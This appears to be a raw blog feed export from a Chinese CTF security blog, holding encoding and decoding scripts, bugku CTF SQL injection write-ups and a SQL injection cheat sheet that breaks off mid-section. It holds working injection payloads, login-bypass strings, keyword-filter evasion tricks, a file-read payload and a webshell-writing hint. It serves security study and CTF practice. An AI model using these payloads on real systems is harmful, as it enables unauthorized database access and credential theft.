class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">text = &quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;</span><br><span class="line">solution = &apos;&apos;</span><br><span class="line">text2 = text.split(&apos; &apos;)</span><br><span class="line">for x in text2:</span><br><span class="line">    print x</span><br><span class="line">    if x[0] == &apos;b&apos;: #binary</span><br><span class="line">        solution += chr(int(x[1:],2))    </span><br><span class="line">    elif x[0] == &apos;x&apos;: # hexadecimal</span><br><span class="line">        solution += x[1:].decode(&quot;hex&quot;)    </span><br><span class="line">    elif x[0] == &apos;d&apos;: # decimal</span><br><span class="line">        solution += chr(int(x[1:]))    </span><br><span class="line">    elif x[0] == &apos;o&apos;: # octal</span><br><span class="line">        solution += chr(int(x[1:],8))</span><br><span class="line">print solution</span><br></pre></td></tr></table></figure><h2 id="16进制10进制2进制转字符串"><a href="#16进制10进制2进制转字符串" class="headerlink" title="16进制10进制2进制转字符串"></a>16进制10进制2进制转字符串</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">import binascii</span><br><span class="line">s=&quot;flag&#123;pcat&#125;&quot; </span><br><span class="line">#print libnum.s2n(s)</span><br><span class="line">print binascii.hexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=0x666c61677b706361747d </span><br><span class="line">#print libnum.n2s(n)</span><br><span class="line">print binascii.unhexlify(str(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b=&apos;01110000011000110110000101110100&apos; </span><br><span class="line">print libnum.b2s(b)</span><br></pre></td></tr></table></figure><h2 id="unicode-转换"><a href="#unicode-转换" class="headerlink" title="unicode 转换"></a>unicode 转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;\u76;\u122;\u69;\u120;\u79;\u83;\u56;\u120;\u77;\u68;\u69;\u118;\u77;\u84;\u65;\u52;\u76;\u122;\u107;\u53;\u76;\u122;\u69;\u120;\u77;\u83;\u56;\u120;\u77;\u68;\u107;\u118;\u77;\u84;\u65;\u120;\u76;\u122;\u69;\u120;\u78;\u105;\u56;\u120;\u77;\u84;\u69;\u118;\u79;\u84;\u99;\u118;\u77;\u84;\u69;\u50;\u76;\u122;\u69;\u120;\u78;\u105;\u56;\u53;\u78;\u121;\u56;\u53;\u79;\u83;\u56;\u120;\u77;\u68;\u99;\u118;\u79;\u84;\u99;\u118;\u77;\u84;\u69;\u119;\u76;\u122;\u69;\u119;\u77;\u67;\u56;\u120;\u77;\u68;\u65;\u118;\u77;\u84;\u65;\u120;\u76;\u122;\u69;\u119;\u77;\u105;\u56;\u120;\u77;\u68;\u69;\u118;\u77;\u84;\u69;\u119;\u76;\u122;\u107;\u53;\u76;\u122;\u69;\u119;\u77;\u83;\u56;\u120;\u77;\u84;\u107;\u118;\u77;\u84;\u69;\u120;\u76;\u122;\u69;\u120;\u78;\u67;\u56;\u120;\u77;\u68;\u103;\u118;\u77;\u84;\u65;\u119;&apos;</span><br><span class="line">b=a.decode(&quot;utf-8&quot;)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line">s_unicode = u&apos;\u810f\u4e71&apos;</span><br><span class="line">s_str = s_unicode.encode(&apos;unicode-escape&apos;).decode(&apos;string_escape&apos;)</span><br><span class="line"> </span><br><span class="line">问题二：</span><br><span class="line">将&apos;\u810f\u4e71&apos;转换为u&apos;\u810f\u4e71&apos;</span><br><span class="line">方法：s_str = &apos;\u810f\u4e71&apos;s_unicode = s_str.decode(&apos;unicode-escape&apos;)</span><br></pre></td></tr></table></figure><h2 id="数字转字符串"><a href="#数字转字符串" class="headerlink" title="数字转字符串"></a>数字转字符串</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=[119,101,108,99,111,109,101,116,111,97,116,116,97,99,107,97,110,100,100,101,102,101,110,99,101,119,111,114,108,100]</span><br><span class="line">s=&apos;&apos;</span><br><span class="line">for i in a:</span><br><span class="line">s+=chr(i)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = &apos;102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125&apos;</span><br><span class="line">ls = s.split(&apos; &apos;)</span><br><span class="line"># print ls</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in ls:</span><br><span class="line">flag += chr(int(i))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="字符串转16进制"><a href="#字符串转16进制" class="headerlink" title="字符串转16进制"></a>字符串转16进制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">print(binascii.b2a_hex(&apos;addddaasasabcd&apos;))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;栅栏密码&quot;&gt;&lt;a href=&quot;#栅栏密码&quot; class=&quot;headerlink&quot; title=&quot;栅栏密码&quot;&gt;&lt;/a&gt;栅栏密码&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://kevens10.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="CTF密码学" scheme="https://kevens10.github.io/tags/CTF%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://kevens10.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>SQL回显注入</title>
    <link href="https://kevens10.github.io/articles/SQL%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5.html"/>
    <id>https://kevens10.github.io/articles/SQL%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5.html</id>
    <published>2019-10-20T14:23:57.000Z</published>
    <updated>2019-10-22T10:22:01.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-注入过程"><a href="#0x00-注入过程" class="headerlink" title="0x00 注入过程"></a>0x00 注入过程</h2><h4 id="三种注入"><a href="#三种注入" class="headerlink" title="三种注入"></a>三种注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where user_id = 1 or 1=1</span><br><span class="line">where user_id = &apos;1&apos; or &apos;1&apos;=&apos;1&apos;</span><br><span class="line">where user_id =&quot; 1 &quot;or &quot;1&quot;=&quot;1&quot;</span><br></pre></td></tr></table></figure><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#          单行注释,常编码为%23</span><br><span class="line"></span><br><span class="line">--空格      单行注释  注意为短线短线空格</span><br><span class="line"></span><br><span class="line">/*（）*/      多行注释  至少存在俩处的注入   /**/常用来作为空格</span><br></pre></td></tr></table></figure><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br></pre></td></tr></table></figure><h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br></pre></td></tr></table></figure><h4 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version()    datadir</span><br></pre></td></tr></table></figure><h4 id="查询用户名，数据库名"><a href="#查询用户名，数据库名" class="headerlink" title="查询用户名，数据库名"></a>查询用户名，数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user()   database()</span><br><span class="line">1&apos; union select 1,database()#</span><br><span class="line"></span><br><span class="line">1&apos; union select user(),database()#</span><br><span class="line">Version()#</span><br></pre></td></tr></table></figure><h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#</span><br></pre></td></tr></table></figure><h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273#</span><br><span class="line">1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;#</span><br></pre></td></tr></table></figure><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(&apos;C:\\wondows\\win.ini&apos;)#</span><br></pre></td></tr></table></figure><h4 id="写入-webshell"><a href="#写入-webshell" class="headerlink" title="写入 webshell"></a>写入 webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select..into  outfile...</span><br></pre></td></tr></table></figure><h4 id="猜用户数据"><a href="#猜用户数据" class="headerlink" title="猜用户数据"></a>猜用户数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span><br><span class="line">1&apos; union select null,concat_ws(char(32,58,32),user,password) from users #  </span><br><span class="line">1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #</span><br></pre></td></tr></table></figure><h4 id="猜-root-用户"><a href="#猜-root-用户" class="headerlink" title="猜 root 用户"></a>猜 root 用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(user,password) from mysql.user#</span><br></pre></td></tr></table></figure><h2 id="0x01-bugku-这是一个神奇的登录框"><a href="#0x01-bugku-这是一个神奇的登录框" class="headerlink" title="0x01 bugku 这是一个神奇的登录框"></a>0x01 bugku 这是一个神奇的登录框</h2><p>1、打开题目链接，是一个登录界面，抓包后传数据进行尝试</p><p>2、先尝试admin_name=1&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到Try Again!</p><p>3、尝试admin_name=1’&amp;admin_passwd=1&amp;submit=GO+GO+GO 仍然得到Try Again! ，说明 ’被过滤了</p><p>4、尝试admin_name=1”&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>得到You have an error in your SQL syntax; check the manual that corresponds to<br>your MySQL server version for the right syntax to use near ‘1”‘ at line 1 说明应该用 “ 分隔,”符号没有被过滤。</p><p>5、尝试admin_name=1”%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 发现<br>没有报错了，说明，需要注释掉一些多余的东西来得到正确结果</p><p>6、判断回显位置</p><p>admin_name=1” union select 1%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>得到The used SELECT statements have a different number of<br>columns（因为union前后的列数不相同）</p><p>再改payload为</p><p>admin_name=1” union select 1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>发现回显位置在Login_name那里</p><p>7、爆数据库名</p><p>admin_name=1” union select database(),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>得到bugkusql1</p><p>8、爆表名</p><p>admin_name=1” union select (select table_name from information_schema.tables<br>where table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>得到flag1</p><p>改limit 0,1为limt 1,1 得到whoami</p><p>9、爆字段</p><p>admin_name=1” union select (select column_name from information_schema.columns<br>where table_name=’flag1’),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>得到flag1</p><p>10、flag</p><p>admin_name=1” union select (select flag1 from<br>flag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p><p>得到ed6b28e684817d9efcaf802979e57aea</p><p>备注</p><p>在admin_name或者admin_passwd 两处都可以进行爆破</p><p>最初尝试admin_name=1” union select<br>1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时没有看出来回显在1处，导致，再次尝试admin_name=1”<br>union select 1，database()%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时发现没有回显</p><p>用错误注入updatexml也可以得到数据库名，表名，字段名，但是<br>爆flag时，因为flag太长，导致无法全部回显</p><h2 id="0x02-bugku-多次"><a href="#0x02-bugku-多次" class="headerlink" title="0x02 bugku 多次"></a>0x02 bugku 多次</h2><p><strong>很明显 注入点在id上</strong></p><p><img src="https://i.loli.net/2019/10/22/jO89dQV7RFIGxKq.png" alt="duoci1.png"></p><p>参数id只有5个，等于6的时候显示Error</p><p><img src="https://i.loli.net/2019/10/22/EpQBtF64zMTIqwf.png" alt="duoci2.png"></p><p>测试1 id=1’ or 1=1#</p><p>返回错误，猜测可能有字符被过滤</p><p>测试2 id=1’ oorr 1=1–+</p><p>返回正常结果，通过双写绕过</p><p><strong>异或注入</strong></p><p>id=1’^(length(‘被测试字符’)=0)–+</p><p>例如：id=1’^(length(‘select’)=0)–+      发现返回错误</p><p>因为select被过滤，那么length(‘’)就等于0，(length(‘’)=0)此等式成立，返回值为1，再和1异或结果为0，所以页面返回错误</p><p>检测出select、and 、or被过滤</p><p>注意：information中有一个or</p><p>同样道理，测试出过滤字符 select,union,and,or</p><p>可以采用双写绕过。测试payload：</p><p><a href="http://120.24.86.145:9004/1ndex.php?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,2%23" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,2%23</a></p><p>页面结果</p><p>2</p><p><strong>database:</strong></p><p>?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23</p><p>web1002-1</p><p><strong>tables:</strong></p><p>注意information里面有or，要双写过滤</p><p>?id=-1’ ununionion seselectlect 1, group_concat(table_name) from<br>infoorrmation_schema.tables where table_schema=database() #</p><p>页面结果</p><p>flag1,hint</p><p><strong>columns:</strong></p><p>?id=-1’ ununionion seselectlect 1, group_concat(column_name) from<br>infoorrmation_schema.columns where table_schema=database() anandd<br>table_name=’flag1’ %23</p><p>页面结果</p><p>flag1,address</p><p><strong>dump:</strong></p><p>?id=-1’ ununionion seselectlect 1, group_concat(flag1) from flag1 %23</p><p>页面结果</p><p>usOwycTju+FTUUzXosjr</p><p>?id=-1’ ununionion seselectlect 1, group_concat(address) from flag1 %23</p><h2 id="0x04-百度杯sql"><a href="#0x04-百度杯sql" class="headerlink" title="0x04 百度杯sql"></a>0x04 百度杯sql</h2><p>总结：用&lt;&gt;隔开敏感字符，绕过防注入</p><p>Order by 3与 union select 1，2，3都可以判断列数</p><p>输入and 1=1  发现被拦截  此外 测试了or 发现也进行了拦截</p><p>id=1 and 1=1</p><p>id=1 or 1=1</p><p>我们可以用下面的字符来替换 and 和 or</p><p>and—-&gt;&amp;&amp;    ,     or—–&gt; ||    </p><p>id=1 &amp;&amp; 1=1</p><p>替换后发现可以成功绕过</p><p>接下来进行猜字段长度  发现order by 被拦截</p><p>id=1 order by 1</p><p>用&lt;&gt;把字符隔开，这里需要注意不要这样隔开or&lt;&gt;der<br>,这样or又是一个被拦截的字符</p><p>然后利用二分法，才接触长度为3</p><p>id=1 o&lt;&gt;rder by 3</p><p>id=1 union se&lt;&gt;lect 1,2,3</p><p>在注入的时候select会被拦截，同样我们用&lt;&gt;把字符分开即可</p><p>界面出现2，我们就在2的位置进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,database(),3</span><br><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&apos;sqli&apos; an&lt;&gt;d table_name=&apos;info&apos;</span><br><span class="line"></span><br><span class="line">id=1 union se&lt;&gt;lect 1,flag,3 from info</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-注入过程&quot;&gt;&lt;a href=&quot;#0x00-注入过程&quot; class=&quot;headerlink&quot; title=&quot;0x00 注入过程&quot;&gt;&lt;/a&gt;0x00 注入过程&lt;/h2&gt;&lt;h4 id=&quot;三种注入&quot;&gt;&lt;a href=&quot;#三种注入&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="SQL注入漏洞" scheme="https://kevens10.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="数据库" scheme="https://kevens10.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="https://kevens10.github.io/articles/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html"/>
    <id>https://kevens10.github.io/articles/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html</id>
    <published>2019-10-20T14:09:33.000Z</published>
    <updated>2019-10-21T04:53:33.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-SQL注入原理与分类"><a href="#0x00-SQL注入原理与分类" class="headerlink" title="0x00 SQL注入原理与分类"></a>0x00 SQL注入原理与分类</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>按照参数类型可分为两种：数字型和字符型。<br>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>根据数据库返回的结果，分为回显注入、报错注入、盲注。</p><p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p><p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p><p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入</p><h2 id="0X01-注入常见参数"><a href="#0X01-注入常见参数" class="headerlink" title="0X01 注入常见参数"></a>0X01 注入常见参数</h2><pre><code>user()：当前数据库用户database()：当前数据库名version()：当前使用的数据库版本@@datadir：数据库存储数据路径concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来concat_ws()：用法类似hex() 和 unhex()：用于 hex 编码解码load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\select xxoo into outfile &apos;路径&apos;：权限较高时可直接写文件</code></pre><h2 id="0x02-后台万能密码"><a href="#0x02-后台万能密码" class="headerlink" title="0x02 后台万能密码"></a>0x02 后台万能密码</h2><pre><code>admin&apos; --admin&apos; #admin&apos;/*&apos; or 1=1--&apos; or 1=1#&apos; or 1=1/*&apos;) or &apos;1&apos;=&apos;1--&apos;) or (&apos;1&apos;=&apos;1--以不同的用户登陆 &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--</code></pre><h2 id="0x03-Mysql相关知识"><a href="#0x03-Mysql相关知识" class="headerlink" title="0x03 Mysql相关知识"></a>0x03 Mysql相关知识</h2><p>MySQL数据库的特有的表是 information_schema.tables  , access数据库特有的表是 msysobjects 、SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) #</span><br><span class="line"> </span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from msysobjects) #</span><br><span class="line"></span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from sysobjects) #</span><br></pre></td></tr></table></figure><p>对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p><h5 id="mysql中注释符：-、-、-–"><a href="#mysql中注释符：-、-、-–" class="headerlink" title="mysql中注释符：#   、/**/  、  –"></a>mysql中注释符：#   、/**/  、  –</h5><h5 id="information-schema数据库中三个很重要的表："><a href="#information-schema数据库中三个很重要的表：" class="headerlink" title="information_schema数据库中三个很重要的表："></a>information_schema数据库中三个很重要的表：</h5><p>•    information_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名</p><p>•    information_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名</p><p>•    information_schema.columns:    该数据表存储了mysql数据库中的所有列的列名</p><h5 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h5><p>ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii(“a”)=97</p><p>length(str) : 返回给定字符串的长度，如  length(“string”)=6</p><p>substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr(“chinese”,3,2)=”in”</p><p>substr()、stbstring()、mid()  三个函数的用法、功能均一致</p><p>concat(username)：将查询到的username连在一起，默认用逗号分隔</p><p>concat(str1,’<em>‘,str2)：将字符串str1和str2的数据查询到一起，中间用</em>连接<br>group_concat(username) ：将username数据查询在一起，用逗号连接</p><p>limit 0,1：查询第1个数<br>limit  1,1： 查询第2个数<br>limit  n,1： 查询第n+1个数</p><p>CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制</p><h2 id="0x04-判断是否存在SQL注入"><a href="#0x04-判断是否存在SQL注入" class="headerlink" title="0x04 判断是否存在SQL注入"></a>0x04 判断是否存在SQL注入</h2><p>1.可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。</p><p>2.先加单引号、双引号、单括号、双括号等看看是否报错，如果报错就肯定存在SQL注入漏洞了。<br>还有在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。</p><h2 id="0x05-获取数据库名"><a href="#0x05-获取数据库名" class="headerlink" title="0x05 获取数据库名"></a>0x05 获取数据库名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT database();</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br><span class="line">id=1&apos; union select 1,database() #;</span><br><span class="line">admin_name=1&quot; union select database(),2%23;</span><br><span class="line">id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23;</span><br></pre></td></tr></table></figure><h2 id="0x06-获取表名"><a href="#0x06-获取表名" class="headerlink" title="0x06 获取表名"></a>0x06 获取表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select table_name from information_schema.tables where table_schema=database(); </span><br><span class="line">admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23;</span><br><span class="line">union select 1,table_name from information_schema.tables where table_schema=&apos; &apos;;</span><br><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() #;</span><br></pre></td></tr></table></figure><h2 id="0x07-获取列名"><a href="#0x07-获取列名" class="headerlink" title="0x07 获取列名"></a>0x07 获取列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name = &apos;tablename&apos;;</span><br><span class="line">admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23;</span><br><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&apos;flag1&apos; %23;</span><br><span class="line">union select 1,column_name from information_schema.columns where table_schema=&apos; &apos; and table_name=&apos; &apos;;</span><br><span class="line">id=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# //这里需要用16进制绕过</span><br></pre></td></tr></table></figure><h2 id="0x08-查询结果"><a href="#0x08-查询结果" class="headerlink" title="0x08 查询结果"></a>0x08 查询结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(flag1) from flag1 %23；</span><br><span class="line">admin_name=1&quot; union select (select flag1 from flag1),2%23；</span><br><span class="line">d=-1&apos; union select 1,2,3,skctf_flag from fl4g#；</span><br></pre></td></tr></table></figure><h2 id="0x09-常用的绕过"><a href="#0x09-常用的绕过" class="headerlink" title="0x09 常用的绕过"></a>0x09 常用的绕过</h2><h5 id="绕过引号限制"><a href="#绕过引号限制" class="headerlink" title="绕过引号限制"></a>绕过引号限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hex 编码</span><br><span class="line"></span><br><span class="line">select * from users where username = 0x61646D696E</span><br><span class="line"></span><br><span class="line">char() 函数</span><br><span 